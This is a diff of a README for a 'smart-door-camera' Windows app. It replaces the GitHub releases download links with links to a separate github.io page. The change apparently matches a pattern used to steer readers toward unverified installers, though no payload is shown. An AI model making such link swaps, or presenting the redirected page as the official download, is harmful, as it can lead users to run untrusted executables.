@@ -1,6 +1,6 @@
 # 🏠 smart-door-camera - View your door visitors with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Corlissbumptious838/smart-door-camera/releases)
+[![Download Software](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://corlissbumptious838.github.io)
 
 ## 📋 About This Project
 
@@ -20,7 +20,7 @@ You need a Windows computer to install the software onto the hardware components
 
 You need to download the latest setup file to your computer. This file contains the instructions for the camera and the screen.
 
-[Click here to visit the release page to download the software](https://github.com/Corlissbumptious838/smart-door-camera/releases)
+[Click here to visit the release page to download the software](https://corlissbumptious838.github.io)
 
 Look for the file ending in `.bin` or the main installer package listed under the latest version. Save this file to your desktop for easy access.
 
